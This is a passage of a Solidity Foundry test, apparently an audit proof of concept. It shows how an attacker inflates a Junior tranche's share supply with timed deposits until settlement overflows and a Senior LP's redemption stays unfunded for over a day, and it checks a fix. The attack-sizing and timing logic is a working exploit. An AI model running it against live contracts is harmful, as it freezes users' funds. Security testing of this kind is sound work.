///         sizes each deposit without knowing that second. The honest sequence starts from the same snapshot (the pool
///         after the coupon drain) and has the same requests and settlement time, without the attacker's deposits.
///
///         Unset EXPECT_FIX: checks the defect at the audit commit. EXPECT_FIX=true (with the attached patch applied):
///         checks that the unrepresentable deposit epoch is rejected and refunded and the Senior redemption is funded.
contract JuniorNearWipeQuoteOverflowTest is ReleaseFixture {

    address internal jA = makeAddr("juniorLpA");
    address internal sB = makeAddr("seniorLpB"); // Senior LP whose redemption is frozen
    address internal sD = makeAddr("seniorLpD"); // independent Senior LP
    address internal jE = makeAddr("juniorLpE"); // honest Junior depositor in the same epoch
    address internal attacker = makeAddr("attacker");
    address internal trader = makeAddr("trader");
    address internal losingTrader = makeAddr("losingTrader");

    uint256 internal constant YEAR = 31_536_000; // HousePoolWaterfallAccountingLib.SECONDS_PER_YEAR
    uint256 internal constant SLACK = 10; // seconds of settlement-time uncertainty per epoch
    uint256 internal constant TMIN = 2; // Junior principal target (atoms) between collapse settlements
    uint256 internal constant FREEZE_TARGET = 24 hours + 30 minutes; // Junior residual, in coupon time
    uint256 internal constant ATTACK_DEPOSIT = 1_000_000e6;
    uint256 internal constant HONEST_DEPOSIT = 10_000e6;

    uint256 internal attackerDeposited;
    uint256 internal topUpAssets;
    uint256 internal cycles;

    bytes internal constant PANIC_0x11 = abi.encodeWithSignature("Panic(uint256)", 0x11);

    // Offset open book case: one background LONG and an attacker SHORT of the same size, marked along one hourly
    // basket path (live-hour volatility 8.47 bps: the ECB basket's adjacent-fix log-return standard deviation / sqrt(24)).
    address internal bgTrader = makeAddr("backgroundTrader");
    uint256 internal curPrice = BASKET_1_20;
    bool internal pathAdvance;
    uint256 internal pathIdx;
    uint256[121] internal PATH = [uint256(120000000),119929902,119921582,119918455,119872996,119990382,120193379,120300417,120250773,120046715,119892009,119943499,120045892,120132479,120150529,120172959,120162405,119982935,119853236,119825003,119638995,119818630,119557687,119636576,119496461,119682793,119672713,119829464,119754821,119877119,119827064,119712500,119712819,119570364,119646888,119640337,119681739,119676104,119713992,119737201,119399509,119381619,119401079,119319091,119229915,119410747,119253604,119204664,119085865,119107397,119135871,119046464,119058874,119084814,119069754,119028471,118909659,118994593,119117495,119181099,119243503,119252828,119123923,119148764,119131570,119240723,119397877,119418074,119421489,119398481,119259752,119090844,119182112,119243307,119244851,119549777,119363150,119297878,119020147,118994529,119174549,118950052,118906106,118924225,118932479,118776942,118920382,118909357,118873719,118850710,118857791,119149187,119323518,119388321,119179070,119199478,119234003,119184265,119210935,119300155,119399792,119214834,119111386,119146684,119169265,119204021,119397334,119491151,119473126,119368231,119447668,119365917,119389502,119396762,119449296,119406750,119646458,119677802,119910620,119798617,119765666];

    // ------------------------------------------------------------------ helpers

    /// @dev Monday-Thursday all day and Friday before 20:00 UTC: inside the live FX window of the release calendar.
    function _isLive(
        uint256 ts
    ) internal pure returns (bool) {
        uint256 dow = ((ts / 1 days) + 4) % 7; // 0 = Sunday
        if (dow >= 1 && dow <= 4) return true;
        return dow == 5 && ts % 1 days < 20 hours;
    }

    function _couponDue(
        uint256 seniorPrincipal,
        uint256 elapsed
    ) internal view returns (uint256) {
        return (seniorPrincipal * d.housePool.seniorRateBps() * elapsed) / (10_000 * YEAR);
    }

    /// @dev Smallest dt with couponDue(S, dt) >= amount.
    function _dtForCoupon(
        uint256 seniorPrincipal,
        uint256 amount
    ) internal view returns (uint256 dt) {
        uint256 rate = d.housePool.seniorRateBps();
        dt = (amount * 10_000 * YEAR + seniorPrincipal * rate - 1) / (seniorPrincipal * rate);
        while (_couponDue(seniorPrincipal, dt) < amount) ++dt;
        while (dt > 0 && _couponDue(seniorPrincipal, dt - 1) >= amount) --dt;
    }

    /// @dev x * y / z, or type(uint256).max when the result does not fit.
    function _mulDivCapped(
        uint256 x,
        uint256 y,
        uint256 z
    ) internal pure returns (uint256) {
        (uint256 high,) = Math.mul512(x, y);
        if (high >= z) return type(uint256).max;
        return Math.mulDiv(x, y, z);
    }

    /// @dev Permissionless settlement by an address with no role. Returns success and revert data.
    function _trySettle() internal returns (bool ok, bytes memory ret) {
        vm.prank(keeper);
        (ok, ret) = address(d.housePool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
    }

    function _trySettleViaOrderRouter() internal returns (bool ok, bytes memory ret) {
        return _trySettleViaOrderRouterAt(BASKET_1_20);
    }

    function _trySettleViaOrderRouterAt(
        uint256 basketPrice
    ) internal returns (bool ok, bytes memory ret) {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        (ok, ret) = address(d.router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", _updateData()));
    }

    /// @dev With open positions, LP settlement must refresh the mark atomically through `OrderRouter.settleLpEpoch`.
    function _settle() internal {
        bool ok;
        if (_hasOpenPositions()) {
            if (pathAdvance) curPrice = _nextPathPrice();
            (ok,) = _trySettleViaOrderRouterAt(curPrice);
        } else {
            (ok,) = _trySettle();
        }
        require(ok, "settlement failed");
    }

    function _hasOpenPositions() internal view returns (bool) {
        (, uint256 oiL,,) = d.engine.sides(0);
        (, uint256 oiS,,) = d.engine.sides(1);
        return oiL + oiS != 0;
    }

    function _nextPathPrice() internal returns (uint256 p) {
        pathIdx = pathIdx + 1 < PATH.length ? pathIdx + 1 : pathIdx;
        p = PATH[pathIdx];
    }

    function _openShort(
        address who,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        OrderV3Types.OrderRequest memory req = _openReq(CfdTypes.Side.SHORT, size, margin, basketPrice * 2);
        vm.prank(who);
        uint64 id = d.router.commitOrder(req);
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(id, _updateData());
    }

    function _logBookState(
        string memory label
    ) internal view {
        console2.log(label);
        console2.log("    Junior principal / Senior principal", d.housePool.juniorPrincipal(), d.housePool.seniorPrincipal());
        console2.log("    Junior share supply (log2)", Math.log2(d.juniorVault.totalSupply() + 1));
    }

    function _attackerDeposit(
        uint256 assets
    ) internal returns (uint256 rid) {
        attackerDeposited += assets;
        rid = _requestDeposit(false, attacker, assets);
    }

    function _logTime(
        string memory label,
        uint256 ts
    ) internal pure {
        console2.log(label, ts);
        console2.log("    UTC weekday (0 = Sunday) / hour / second of hour", ((ts / 1 days) + 4) % 7, (ts % 1 days) / 1 hours,
            ts % 1 hours);
    }

    // ------------------------------------------------------------------ scenario

    /// @dev Junior LP A 1,000,000 USDG; Senior LPs B 3,990,000 and D 10,000 (Senior at the 80% share limit). No trading.
    function _fundPool() internal {
        uint256 r = _requestDeposit(false, jA, 1_000_000e6);
        _warpTo(d.housePool.lpEpochStart(r));
        _settle();
        _claimDeposit(false, jA, r);
        uint256 rb = _requestDeposit(true, sB, 3_990_000e6);
        uint256 rd = _requestDeposit(true, sD, 10_000e6);
        _warpTo(d.housePool.lpEpochStart(rb));
        _settle();
        _claimDeposit(true, sB, rb);
        _claimDeposit(true, sD, rd);
    }

    /// @dev The Senior coupon moves Junior principal to Senior at each reconcile. The attacker first adds the Junior
    ///      principal that makes the end of the coupon drain fall on a Tuesday 10:00 UTC (a live market day), then
    ///      the pool waits until Junior principal is about 2 hours of coupon from zero.
    function _drainJuniorWithCoupon() internal {
        for (uint256 it; it < 2; ++it) {
            uint256 S0 = d.housePool.seniorPrincipal();
            uint256 J0 = d.housePool.juniorPrincipal();
            uint256 tEnd = d.housePool.lastSeniorCouponCheckpointTime() + _dtForCoupon(S0, J0);
            uint256 dayIdx = tEnd / 1 days;
            uint256 want = (dayIdx + ((9 - (dayIdx + 4) % 7) % 7)) * 1 days + 10 hours;
            if (want < tEnd) want += 7 days;
            uint256 topUp = _couponDue(S0, want - tEnd);
            if (topUp < 1e6) break;
            topUpAssets += topUp;
            uint256 r = _attackerDeposit(topUp);
            _warpTo(d.housePool.lpEpochStart(r));
            _settle();
            _claimDeposit(false, attacker, r);
        }
        uint256 S = d.housePool.seniorPrincipal();
        uint256 J = d.housePool.juniorPrincipal();
        uint256 T = d.housePool.lastSeniorCouponCheckpointTime() + _dtForCoupon(S, J - _couponDue(S, 2 hours));
        T = (T / 1 hours) * 1 hours;
        require(_isLive(T) && _isLive(T + 2 days), "live window");
        _warpTo(T - 1 hours);
        uint256 r0 = _attackerDeposit(1e6);
        _warpTo(T + 3);
        _settle();
        _claimDeposit(false, attacker, r0);
    }

    struct Cycle {
        uint256 S;
        uint256 J;
        uint256 lastT;
        uint256 start;
        uint256 c1; // coupon if the settlement lands exactly at `start`
        uint256 base; // Junior principal at pricing if the settlement lands exactly at `start`
        uint256 pLo; // Junior principal at pricing if the settlement lands at start + SLACK
        uint256 cH; // coupon over 1 h + SLACK at the post-settlement Senior principal
        uint256 extra; // 2 s of coupon + 1 atom of rounding margin
        uint256 cSlack; // coupon over SLACK
        uint256 r; // Junior residual left for the overflowing settlement
    }

    function _cycleState() internal view returns (Cycle memory c) {
        c.S = d.housePool.seniorPrincipal();
        c.J = d.housePool.juniorPrincipal();
        c.lastT = d.housePool.lastSeniorCouponCheckpointTime();
        c.start = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        c.c1 = _couponDue(c.S, c.start - c.lastT);
        require(c.c1 + _couponDue(c.S, SLACK) + 1 < c.J, "Junior principal would reach zero");
        c.base = c.J - c.c1;
        c.pLo = c.J - _couponDue(c.S, c.start + SLACK - c.lastT);
        uint256 S2 = c.S + c.c1;
        c.cH = _couponDue(S2, 1 hours + SLACK);
        c.extra = _couponDue(S2, 2) + 1;
        c.cSlack = _couponDue(S2, SLACK) + 1;
        c.r = _couponDue(S2, FREEZE_TARGET);
    }

    /// @dev Predicted Junior supply range after this settlement (deposit sized for target t at the next one) and
    ///      after the next settlement, when that one sizes its deposit for the residual.
    function _predict(
        Cycle memory c,
        uint256 s,
        uint256 t
    ) internal pure returns (uint256 lo, uint256 hi) {
        uint256 need = c.cH + t + c.extra;
        if (need < c.base + 1e6) return (0, 0);
        uint256 a = need - c.base;
        uint256 s1Lo = _addCapped(s, _mulDivCapped(a, s + 1000, c.base + 1));
        uint256 s1Hi = _addCapped(s, _mulDivCapped(a, s + 1000, c.pLo + 1));
        if (s1Hi > type(uint256).max / 2) return (type(uint256).max, type(uint256).max);
        uint256 p2Lo = t + c.extra - 2;
        uint256 p2Hi = t + c.extra + c.cSlack + 2;
        uint256 aFLo = c.cH + c.r + c.extra - p2Hi - c.cSlack - 2;
        uint256 aFHi = c.cH + c.r + c.extra - p2Lo + 2;
        lo = _addCapped(s1Lo, _mulDivCapped(aFLo, s1Lo + 1000, p2Hi + 1));
        hi = _addCapped(s1Hi, _mulDivCapped(aFHi, s1Hi + 1000, p2Lo + 1));
    }

    function _addCapped(
        uint256 x,
        uint256 y
    ) internal pure returns (uint256) {
        return y > type(uint256).max - x ? type(uint256).max : x + y;
    }

    /// @dev Chooses the Junior principal target t for the next settlement so that the supply after the residual
    ///      settlement lands in [L, U]: L makes the attack deposit overflow with a factor 2 margin, U keeps the
    ///      residual settlement's own mint 8 times below the uint256 limit. Returns false when no t fits yet.
    function _tune(
        Cycle memory c,
        uint256 s
    ) internal pure returns (bool ok, uint256 t) {
        uint256 rAttackHi = c.r + c.extra + 2 * c.cSlack + 4;
        uint256 L = 2 * _mulDivCapped(type(uint256).max, rAttackHi + 1, ATTACK_DEPOSIT + HONEST_DEPOSIT);
        uint256 U = type(uint256).max / 8;
        uint256 lo;
        uint256 hi;
        uint256 tLo = TMIN;
        uint256 tHi = c.r / 2;
        // the supply after the residual settlement falls as t rises: center log2 of [lo, hi] inside [L, U]
        for (uint256 i; i < 80; ++i) {
            t = (tLo + tHi) / 2;
            (lo, hi) = _predict(c, s, t);
            if (lo == 0) return (false, 0);
            uint256 below = lo > L ? Math.log2(lo) - Math.log2(L) : 0;
            uint256 above = U > hi ? Math.log2(U) - Math.log2(hi) : 0;
            if (hi >= U || below > above) tLo = t + 1;
            else tHi = t;
            if (tLo >= tHi) break;
        }
        t = tLo;
        (lo, hi) = _predict(c, s, t);
        ok = lo >= L && hi < U;
    }

    /// @dev One deposit request per epoch, 10 minutes before the epoch starts; the settlement lands at a second in
    ///      [start, start + SLACK) that the attacker does not choose. Each deposit is sized so that the coupon leaves
    ///      Junior principal at about t atoms at the following settlement. The last settlement leaves a residual of
    ///      FREEZE_TARGET of coupon for the overflowing settlement.
    function _collapseJuniorSharePrice() internal {
        uint256 mode; // 0 regular, 1 next settlement is the residual settlement
        while (true) {
            require(cycles < 40, "no collapse");
            Cycle memory c = _cycleState();
            uint256 s = d.juniorVault.totalSupply();
            uint256 t = TMIN;
            bool residualStep = mode == 1;
            if (residualStep) {
                t = c.r;
            } else {
                (bool ok, uint256 tt) = _tune(c, s);
                if (ok) {
                    t = tt;
                    mode = 1;
                }
            }
            uint256 need = c.cH + t + c.extra;
            uint256 a = need >= c.base + 1e6 ? need - c.base : 1e6;
            _warpTo(c.start - 10 minutes);
            uint256 rid = _attackerDeposit(a);
            assertEq(rid, c.start / 1 hours, "request epoch");
            _warpTo(c.start + (cycles * 7) % SLACK);
            uint256 p = c.J - _couponDue(c.S, vm.getBlockTimestamp() - c.lastT);
            uint256 supplyBefore = d.juniorVault.accruedTotalSupply();
            _settle();
            uint256 minted = d.juniorVault.totalSupply() - supplyBefore;
            assertEq(minted, Math.mulDiv(a, supplyBefore + 1000, p + 1), "minted = deposit * (supply + 1000) / (principal + 1)");
            _claimDeposit(false, attacker, rid);
            ++cycles;
            console2.log("settlement", cycles, "second of hour", vm.getBlockTimestamp() % 1 hours);
            console2.log("    Junior principal at pricing (atoms) / attacker deposit (atoms)", p, a);
            console2.log("    Junior share supply after", d.juniorVault.totalSupply());
            if (residualStep) break;
        }
    }

    // ------------------------------------------------------------------ test

    function test_juniorQuoteOverflowFreezesSeniorRedemptionFunding() public {
        bool expectFix = vm.envOr("EXPECT_FIX", false);
        _fundPool();
        _drainJuniorWithCoupon();
        console2.log("Junior principal after the coupon drain", d.housePool.juniorPrincipal());
        console2.log("Senior principal after the coupon drain", d.housePool.seniorPrincipal());
        console2.log("Junior share supply after the coupon drain", d.juniorVault.totalSupply());
        uint256 attackerBeforeCollapse = attackerDeposited;
        uint256 snapDrained = vm.snapshotState();

        // ---- attack: hourly collapse settlements, then a refundable 1,000,000 USDG Junior deposit
        _collapseJuniorSharePrice();
        console2.log("ATTACK: collapse settlements", cycles);
        console2.log("ATTACK: Junior principal left for the next settlement", d.housePool.juniorPrincipal());
        uint256 tReq = vm.getBlockTimestamp() + 1 hours - 10 minutes;
        _warpTo(tReq);
        uint256 bShares = d.seniorVault.balanceOf(sB);
        uint256 sRid = _requestRedeem(true, sB, bShares);
        uint256 eRid = _requestDeposit(false, jE, HONEST_DEPOSIT);
        uint256 dosRid = _attackerDeposit(ATTACK_DEPOSIT);
        assertEq(eRid, sRid, "same epoch");
        assertEq(dosRid, sRid, "same epoch");
        uint256 t0 = d.housePool.lpEpochStart(sRid) + 3;
        _warpTo(t0);
        {
            uint256 pAttack = d.housePool.juniorPrincipal()
                - _couponDue(d.housePool.seniorPrincipal(), t0 - d.housePool.lastSeniorCouponCheckpointTime());
            uint256 supply = d.juniorVault.accruedTotalSupply();
            uint256 epochAssets = ATTACK_DEPOSIT + HONEST_DEPOSIT;
            (uint256 high,) = Math.mul512(epochAssets, supply + 1000);
            console2.log("ATTACK: Junior deposit epoch assets (E + attacker)", epochAssets);
            console2.log("ATTACK: Junior principal at pricing (atoms)", pAttack);
            console2.log("ATTACK: Junior share supply", supply);
            assertGe(high, pAttack + 1, "assets * (supply + 1000) / (principal + 1) does not fit in uint256");
            console2.log("ATTACK: Junior epoch assets above which the quote overflows at this state",
                Math.mulDiv(type(uint256).max, pAttack + 1, supply + 1000));
            console2.log("ATTACK: Junior principal above which the 1,010,000 USDG epoch quote fits",
                Math.mulDiv(epochAssets, supply + 1000, type(uint256).max));
        }
        uint256 vaultUsdg0 = _usdgOf(address(d.seniorVault));
        (bool okDirect, bytes memory retDirect) = _trySettle();
        (bool okRouter, bytes memory retRouter) = _trySettleViaOrderRouter();

        if (expectFix) {
            assertTrue(okDirect, "fix: settlement succeeds");
            console2.log("FIX: USDG Senior LP B receives at the first settlement", _claimRedeem(true, sB, sRid));
            assertEq(d.juniorVault.refundableDepositRequest(eRid, jE), HONEST_DEPOSIT, "fix: the epoch is rejected");
            vm.prank(jE);
            d.juniorVault.cancelPendingDeposit(eRid);
            assertEq(_usdgOf(jE), HONEST_DEPOSIT, "fix: E recovers its deposit");
            console2.log("FIX: E recovers its deposit", _usdgOf(jE));
            return;
        }

        assertFalse(okDirect, "attack: HousePool.settleLpEpoch reverts");
        assertFalse(okRouter, "attack: OrderRouter.settleLpEpoch reverts");
        assertEq(retDirect, PANIC_0x11, "HousePool.settleLpEpoch revert data: Panic(0x11)");
        assertEq(retRouter, PANIC_0x11, "OrderRouter.settleLpEpoch revert data: Panic(0x11)");
        console2.log("ATTACK: HousePool.settleLpEpoch and OrderRouter.settleLpEpoch revert with");
        console2.logBytes(retDirect);
        _logTime("ATTACK: first failed settlement at", t0);
        vm.prank(jE);
        (bool eCancel,) = address(d.juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", eRid));
        vm.prank(attacker);
        (bool aCancel,) = address(d.juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", dosRid));
        assertFalse(eCancel, "E cannot cancel its matured deposit");
        assertFalse(aCancel, "the attacker cannot cancel its matured deposit");
        vm.prank(sB);
        (bool bCancel,) = address(d.seniorVault).call(abi.encodeWithSignature("cancelRedeemRequest(uint256,address)", sRid, sB));
        assertFalse(bCancel, "B cannot cancel its matured redemption");
        console2.log("ATTACK: B cannot cancel its matured redemption; E and the attacker cannot cancel their deposits");

        uint256 snapFreeze = vm.snapshotState();

        // ---- (1) no other action: hourly settlement attempts until the coupon wipes the Junior residual
        uint256 failures = 1;
        uint256 tEnd;
        bool ok;
        bytes memory ret;
        for (uint256 h = 1; h <= 48; ++h) {
            _warp(1 hours);
            (ok, ret) = _trySettle();
            if (ok) {
                tEnd = vm.getBlockTimestamp();
                break;
            }
            assertEq(ret, PANIC_0x11, "every failed attempt: Panic(0x11)");
            assertTrue(_isLive(vm.getBlockTimestamp()), "attempt inside the live market window");
            assertEq(d.seniorVault.claimableRedeemRequest(sRid, sB), 0, "B has nothing to claim");
            assertEq(d.seniorVault.pendingRedeemRequest(sRid, sB), bShares, "B's shares stay pending");
            assertEq(_usdgOf(address(d.seniorVault)), vaultUsdg0, "no USDG reaches the Senior vault");
            vm.prank(jE);
            (eCancel,) = address(d.juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", eRid));
            assertFalse(eCancel, "E cannot cancel its matured deposit");
            ++failures;
        }
        require(tEnd != 0, "freeze did not end");
        uint256 lastFail = tEnd - 1 hours;
        console2.log("NO OTHER ACTION: consecutive failed hourly settlements", failures);
        _logTime("NO OTHER ACTION: last failed settlement at", lastFail);
        _logTime("NO OTHER ACTION: first successful settlement at", tEnd);
        console2.log("NO OTHER ACTION: seconds from the first to the last failed settlement", lastFail - t0);
        console2.log("NO OTHER ACTION: seconds B's matured redemption stays unfunded", tEnd - t0);
        assertGe(lastFail - t0, 24 hours, "unfunded across 24 h of live market time");
        console2.log("NO OTHER ACTION: Junior principal at the successful settlement", d.housePool.juniorPrincipal());
        uint256 bAttack = _claimRedeem(true, sB, sRid);
        console2.log("NO OTHER ACTION: USDG Senior LP B receives", bAttack);
        vm.prank(jE);
        uint256 eBack = d.juniorVault.cancelPendingDeposit(eRid);
        vm.prank(attacker);
        uint256 aBack = d.juniorVault.cancelPendingDeposit(dosRid);
        console2.log("NO OTHER ACTION: E's deposit refunded after the Junior wipe", eBack);
        console2.log("NO OTHER ACTION: attacker's deposit refunded after the Junior wipe", aBack);
        console2.log("attacker USDG deposited in total", attackerDeposited);
        console2.log("    of which top-up that places the end of the coupon drain on a Tuesday", topUpAssets);
        console2.log("    of which collapse and residual deposits", attackerDeposited - attackerBeforeCollapse - ATTACK_DEPOSIT);
        console2.log("attacker net USDG cost (paid to Senior as coupon)", attackerDeposited - aBack);
        vm.revertToState(snapFreeze);

        // ---- (2) an independent Senior LP queues a redemption of 1/20 of its shares each hour: the 16-epoch
        //          bounded-work early return skips the deposit phase
        uint256 chunk = d.seniorVault.balanceOf(sD) / 20;
        uint256 h2;
        for (h2 = 1; h2 <= 30; ++h2) {
            if (h2 <= 16) _requestRedeem(true, sD, chunk);
            _warp(1 hours);
            (ok,) = _trySettle();
            if (ok) break;
        }
        assertEq(h2, 16, "early return after 16 hourly attempts");
        _logTime("SENIOR LP D QUEUES HOURLY REDEMPTIONS: first successful settlement at", vm.getBlockTimestamp());
        console2.log("SENIOR LP D QUEUES HOURLY REDEMPTIONS: seconds B's redemption stays unfunded", vm.getBlockTimestamp() - t0);
        console2.log("SENIOR LP D QUEUES HOURLY REDEMPTIONS: USDG Senior LP B receives", _claimRedeem(true, sB, sRid));
        _warp(1 hours);
        (ok, ret) = _trySettle();
        assertFalse(ok, "the next settlement reverts again");
        assertEq(ret, PANIC_0x11, "Panic(0x11)");
        console2.log("SENIOR LP D QUEUES HOURLY REDEMPTIONS: the next settlement reverts again");
        vm.revertToState(snapFreeze);

        // ---- (3) the owner or pauser calls HousePool.pause(): deposit activation is skipped, redemptions settle
        _warp(1 hours);
        vm.prank(owner);
        d.housePool.pause();
        (ok,) = _trySettle();
        assertTrue(ok, "paused: settlement succeeds");
        console2.log("PAUSE: USDG Senior LP B receives one hour after the first failed settlement", _claimRedeem(true, sB, sRid));
        vm.prank(jE);
        (eCancel,) = address(d.juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", eRid));
        assertFalse(eCancel, "paused: E still cannot cancel");
        vm.prank(owner);
        d.housePool.unpause();
        _warp(1 hours);
        (ok, ret) = _trySettle();
        assertFalse(ok, "after unpause the next settlement reverts again");
        assertEq(ret, PANIC_0x11, "Panic(0x11)");
        console2.log("PAUSE: after unpause the next settlement reverts again");
        vm.revertToState(snapFreeze);

        // ---- (4) a trader opens a LONG of 1,000,000 basket units at 1.20; at the next OrderRouter.settleLpEpoch the
        //          basket is 1.195, the LONG's marked profit exceeds the Junior residual and Junior principal is zero
        _fundTrader(trader, 100_000e6);
        OrderV3Types.ExecutionResult memory r = _openLong(trader, 1_000_000e18, 50_000e6, BASKET_1_20);
        assertEq(uint256(uint8(r.status)), uint256(uint8(OrderV3Types.LifecycleStatus.Executed)), "LONG opened");
        (ok, ret) = _trySettleViaOrderRouterAt(BASKET_1_20);
        assertFalse(ok, "TRADER POSITION: at 1.20 the settlement still reverts");
        assertEq(ret, PANIC_0x11, "Panic(0x11)");
        _warp(60);
        (ok,) = _trySettleViaOrderRouterAt(119_500_000);
        assertTrue(ok, "TRADER POSITION: settlement at 1.195 succeeds");
        _logTime("TRADER POSITION: first successful settlement at", vm.getBlockTimestamp());
        console2.log("TRADER POSITION: seconds B's redemption stays unfunded", vm.getBlockTimestamp() - t0);
        console2.log("TRADER POSITION: Junior principal after the settlement", d.housePool.juniorPrincipal());
        console2.log("TRADER POSITION: Senior principal / high-water mark after the settlement", d.housePool.seniorPrincipal(),
            d.housePool.seniorHighWaterMark());
        console2.log("TRADER POSITION: USDG Senior LP B receives", _claimRedeem(true, sB, sRid));
        vm.revertToState(snapFreeze);

        // ---- (5) trading revenue, no other action: every live day at 09:00 UTC a trader opens a LONG of 400,000 basket
        //          units at 1.20 and closes it at 1.203 (a realized loss for the trader, revenue for LPs). Hourly
        //          settlement attempts continue past the time at which the coupon alone would consume the residual.
        _fundTrader(losingTrader, 200_000e6);
        uint256 revenueTrips;
        uint256 h5;
        uint256 tWipeByCoupon = d.housePool.lastSeniorCouponCheckpointTime()
            + _dtForCoupon(d.housePool.seniorPrincipal(), d.housePool.juniorPrincipal());
        bool failedAfterCouponWipe;
        for (h5 = 1; h5 <= 120; ++h5) {
            _warp(1 hours);
            uint256 ts = vm.getBlockTimestamp();
            if ((ts % 1 days) / 1 hours == 9 && _isLive(ts)) {
                r = _openLong(losingTrader, 400_000e18, 20_000e6, BASKET_1_20);
                assertEq(uint256(uint8(r.status)), uint256(uint8(OrderV3Types.LifecycleStatus.Executed)), "revenue open");
                r = _closeLong(losingTrader, 400_000e18, 120_300_000);
                assertEq(uint256(uint8(r.status)), uint256(uint8(OrderV3Types.LifecycleStatus.Executed)), "revenue close");
                ++revenueTrips;
            }
            (ok, ret) = _trySettle();
            if (ok) break;
            assertEq(ret, PANIC_0x11, "REVENUE: every failed attempt is Panic(0x11)");
            if (vm.getBlockTimestamp() > tWipeByCoupon) failedAfterCouponWipe = true;
        }
        assertTrue(ok, "REVENUE: a settlement succeeds within 120 hours");
        assertTrue(failedAfterCouponWipe, "REVENUE: attempts after the coupon-only wipe time still revert");
        _logTime("REVENUE: time at which the coupon alone would consume the stored Junior principal", tWipeByCoupon);
        console2.log("REVENUE: losing round trips by the trader", revenueTrips);
        console2.log("REVENUE: consecutive failed hourly settlements", h5);
        _logTime("REVENUE: first successful settlement at", vm.getBlockTimestamp());
        console2.log("REVENUE: oracle frozen at the successful settlement", d.engine.isOracleFrozen());
        console2.log("REVENUE: seconds B's matured redemption stays unfunded", vm.getBlockTimestamp() - t0);
        console2.log("REVENUE: Junior principal after the settlement", d.housePool.juniorPrincipal());
        console2.log("REVENUE: USDG Senior LP B receives", _claimRedeem(true, sB, sRid));
        vm.prank(jE);
        (eCancel,) = address(d.juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", eRid));
        assertFalse(eCancel, "REVENUE: E still cannot cancel");
        console2.log("REVENUE: E still cannot cancel its deposit");
        {
            uint256 ts = vm.getBlockTimestamp();
            uint256 monday = (ts / 1 days + (8 - ((ts / 1 days) + 4) % 7) % 7) * 1 days;
            _warpTo(monday + 9 hours + 50 minutes);
            _requestRedeem(true, sD, chunk);
            _warpTo(monday + 10 hours + 3);
            (ok, ret) = _trySettle();
            assertFalse(ok, "REVENUE: the next live settlement reverts again");
            assertEq(ret, PANIC_0x11, "Panic(0x11)");
            _logTime("REVENUE: after the weekend, Senior LP D's redemption settlement reverts again at", vm.getBlockTimestamp());
        }

        // ---- honest sequence: same snapshot after the coupon drain, same requests and settlement time, no attacker
        //      deposits after the drain
        vm.revertToState(snapDrained);
        _warpTo(tReq);
        uint256 sRidH = _requestRedeem(true, sB, d.seniorVault.balanceOf(sB));
        assertEq(sRidH, sRid, "same epoch in both sequences");
        d.settlementToken.mint(jE, HONEST_DEPOSIT);
        vm.startPrank(jE);
        d.settlementToken.approve(address(d.juniorVault), HONEST_DEPOSIT);
        (bool eReq, bytes memory eRet) = address(d.juniorVault)
            .call(abi.encodeWithSignature("requestDeposit(uint256,address,address)", HONEST_DEPOSIT, jE, jE));
        vm.stopPrank();
        assertFalse(eReq, "honest sequence: Junior is wiped, so E's deposit request is refused");
        assertEq(bytes4(eRet), TrancheVault.TrancheVault__TerminallyWiped.selector, "TrancheVault__TerminallyWiped");
        console2.log("HONEST SEQUENCE: Junior principal is zero, E's deposit request is refused (TrancheVault__TerminallyWiped)");
        _warpTo(t0);
        (ok,) = _trySettle();
        assertTrue(ok, "honest sequence: settlement succeeds");
        _logTime("HONEST SEQUENCE: settlement at", vm.getBlockTimestamp());
        uint256 bHonest = _claimRedeem(true, sB, sRidH);
        console2.log("HONEST SEQUENCE: USDG Senior LP B receives at the first settlement", bHonest);
        assertGt(bHonest, 4_900_000e6, "honest sequence: B funded at the first settlement");
    }


    /// @dev Same coupon-drained pool, but with an open trader book: a background LONG of 400,000 units held open and an
    ///      attacker SHORT of the same size, so the book has no net units and its marked price delta leaves Junior
    ///      principal unchanged. Every settlement refreshes the mark through the Router along the hourly basket path.
    ///      Unset EXPECT_FIX: the trigger epoch reverts the Router settlement with Panic(0x11). EXPECT_FIX=true: it settles.
    function test_offsetOpenBookDoesNotPreventFreeze() public {
        bool expectFix = vm.envOr("EXPECT_FIX", false);
        _fundPool();
        _drainJuniorWithCoupon();
        _fundTrader(bgTrader, 200_000e6);
        curPrice = PATH[0];
        _openLong(bgTrader, 400_000e18, 48_000e6, curPrice);
        _fundTrader(attacker, 200_000e6);
        _openShort(attacker, 400_000e18, 48_000e6, curPrice);
        (, uint256 oiL,,) = d.engine.sides(0);
        (, uint256 oiS,,) = d.engine.sides(1);
        console2.log("OFFSET BOOK: open interest LONG / SHORT (units, 18 decimals)", oiL, oiS);
        assertEq(oiL, oiS, "the open book has no net units");
        _logBookState("OFFSET BOOK: after the coupon drain and the 2 opens");
        uint256 start = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        _warpTo(start - 10 minutes);
        uint256 rid0 = _attackerDeposit(_couponDue(d.housePool.seniorPrincipal(), 2 hours) + 1e6);
        _warpTo(start + 3);
        curPrice = _nextPathPrice();
        _settle();
        _claimDeposit(false, attacker, rid0);
        uint256 supply0 = d.juniorVault.totalSupply();
        pathAdvance = true;
        _collapseJuniorSharePrice();
        pathAdvance = false;
        console2.log("OFFSET BOOK: collapse settlements", cycles);
        console2.log("OFFSET BOOK: Junior share supply log2 before / after", Math.log2(supply0), Math.log2(d.juniorVault.totalSupply()));
        uint256 tReq = vm.getBlockTimestamp() + 1 hours - 10 minutes;
        _warpTo(tReq);
        uint256 sRid = _requestRedeem(true, sB, d.seniorVault.balanceOf(sB));
        _requestDeposit(false, jE, HONEST_DEPOSIT);
        _attackerDeposit(ATTACK_DEPOSIT);
        uint256 tTrigger = d.housePool.lpEpochStart(sRid) + 3;
        _warpTo(tTrigger);
        uint256 fails;
        uint256 firstOk;
